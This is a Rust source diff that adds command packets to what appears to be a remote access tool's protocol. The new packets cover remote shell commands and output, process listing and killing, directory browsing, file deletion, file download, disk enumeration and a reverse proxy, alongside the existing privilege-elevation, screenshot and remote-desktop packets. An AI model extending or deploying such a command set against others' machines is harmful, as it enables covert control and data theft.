@@ -12,6 +12,7 @@ pub struct ClientInfo {
     pub storage: Vec<String>,
     pub displays: i32,
     pub is_elevated: bool,
+    pub reverse_proxy_port: String,
 }
 
 pub trait Packet {
@@ -29,7 +30,16 @@ pub enum ServerboundPacket {
     EncryptionConfirm(Vec<u8>, Vec<u8>), // encrypted secret and token
     ClientInfo(ClientInfo),
     ScreenshotResult(Vec<u8>),
-    RemoteDesktopFrame(RemoteDesktopFrame)
+    RemoteDesktopFrame(RemoteDesktopFrame),
+    ProcessList(ProcessList),
+    ShellOutput(String),
+
+
+    DonwloadFileResult(FileData),
+
+    DisksResult(Vec<String>),
+    FileList(Vec<File>),
+    CurrentFolder(String),
 }
 
 impl Packet for ServerboundPacket {
@@ -51,6 +61,12 @@ impl Packet for ServerboundPacket {
             ServerboundPacket::ClientInfo(_) => "ClientInfo",
             ServerboundPacket::ScreenshotResult(_) => "ScreenshotResult",
             ServerboundPacket::RemoteDesktopFrame(_) => "RemoteDesktopFrame",
+            ServerboundPacket::ProcessList(_) => "ProcessList",
+            ServerboundPacket::ShellOutput(_) => "ShellOutput",
+            ServerboundPacket::DonwloadFileResult(_) => "DonwloadFileResult",
+            ServerboundPacket::DisksResult(_) => "DisksResult",
+            ServerboundPacket::FileList(_) => "FileList",
+            ServerboundPacket::CurrentFolder(_) => "CurrentFolder",
         }
     }
 }
@@ -71,6 +87,25 @@ pub enum ClientboundPacket {
     VisitWebsite(VisitWebsiteData),
     ShowMessageBox(MessageBoxData),
     ElevateClient,
+    ManageSystem(String),
+
+    GetProcessList,
+    KillProcess(Process),
+
+    StartShell,
+    ExitShell,
+    ShellCommand(String),
+
+
+    ViewDir(String),
+    PreviousDir,
+    RemoveDir(String),
+    RemoveFile(String),
+    DownloadFile(String),
+    AvailableDisks,
+
+    StartReverseProxy(String),
+    StopReverseProxy,
 }
 
 impl Packet for ClientboundPacket {
@@ -100,6 +135,22 @@ impl Packet for ClientboundPacket {
             ClientboundPacket::VisitWebsite(_) => "VisitWebsite",
             ClientboundPacket::ShowMessageBox(_) => "ShowMessageBox",
             ClientboundPacket::ElevateClient => "ElevateClient",
+            ClientboundPacket::ManageSystem(_) => "ManageSystem",
+            ClientboundPacket::GetProcessList => "GetProcessList",
+            ClientboundPacket::KillProcess(_) => "KillProcess",
+            ClientboundPacket::StartShell => "StartShell",
+            ClientboundPacket::ExitShell => "ExitShell",
+            ClientboundPacket::ShellCommand(_) => "ShellCommand",
+
+            ClientboundPacket::ViewDir(_) => "ViewDir",
+            ClientboundPacket::PreviousDir => "PreviousDir",
+            ClientboundPacket::RemoveDir(_) => "Remove Dir",
+            ClientboundPacket::RemoveFile(_) => "Remove File",
+            ClientboundPacket::DownloadFile(_) => "Download File",
+            ClientboundPacket::AvailableDisks => "Available Disks",
+
+            ClientboundPacket::StartReverseProxy(_) => "Start Reverse Proxy",
+            ClientboundPacket::StopReverseProxy => "Stop Reverse Proxy",
         }
     }
 }
@@ -138,4 +189,27 @@ pub struct MessageBoxData {
     pub message: String,
     pub button: String,
     pub icon: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct ProcessList {
+    pub processes: Vec<Process>,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct Process {
+    pub pid: usize,
+    pub name: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct File {
+    pub file_type: String,
+    pub name: String,
+}
+
+#[derive(Serialize, PartialEq, Eq, Deserialize, Debug, Clone)]
+pub struct FileData {
+    pub name: String,
+    pub data: Vec<u8>,
 }
